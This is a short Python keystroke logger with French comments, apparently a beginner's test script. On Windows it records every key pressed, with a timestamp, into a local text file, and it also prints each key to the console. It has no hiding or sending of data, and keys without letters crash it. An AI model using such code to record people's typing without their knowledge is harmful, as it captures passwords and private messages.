import platform, sys, re
sys.path.append(r"c:\users\feuil\appdata\local\packages\pythonsoftwarefoundation.python.3.11_qbz5n2kfra8p0\localcache\local-packages\python311\site-packages")
from pynput.keyboard import Key, Listener
from datetime import datetime

ficname = 'fic_test1.txt'

def on_press(touche):
    print(f"{touche} pressée")
    fic_write(str(touche))

def on_release(touche):
    print(f"{touche} relâchée")
    if touche==Key.esc:
        return False

def file_open(*texts):
    with open(ficname, 'a') as fic:
        for text in texts:
            fic.write(text)

def cle_speciale(char):
    if "enter" in char:
        file_open('\n')
    if "space" in char:
        file_open(' ')
    if "backspace" in char:
        with open(ficname,'rb+') as fic:
            fic.seek(-1,2)
            fic.truncate()
    if "caps" in char: # touche majuscule
        return -1
    if "tab" in char:
        file_open('\t')
    if "shift" in char:
        file_open('{Shift}')
    if "esc" in char:
        file_open('{Echap}')

def fic_write(char):
    cara = re.findall(r'[A-Za-z]',char)
    cara = ''.join(cara)
    # SI LONGUEUR EST PLUS GRANDE QUE 1
    # CÀD SI LA TOUCHE N'EST PAS UNE LETTRE
    # EXEMPLE : ENTER, BACK, CTRL
    # ENTRER DANS LA FONCTION SWITCH CASE
    if (len(cara)-1>0):
        cle_speciale(cara)
    else:
        c = cara[0]
        file_open(c)

def klisten():
    now = datetime.now()
    hour = now.strftime('%H:%M:%S')
    jour = now.strftime('%d/%m/%Y')
    file_open('\n\n'+jour+' >> '+hour+'\n\n')
        # Ajouter un compteur de temps
    with Listener(on_press=on_press,on_release=on_release) as lili:
        lili.join()

if "Linux" in platform.system():
    # Je suis sous Linux
    try:
        print("Linux")
    except Exception as e:
        print(f"Error: {e}")

elif "Windows" in platform.system():
    # Je suis sous Windows
    try:
        klisten()
    except Exception as e:
        print(f"Error: {e}")
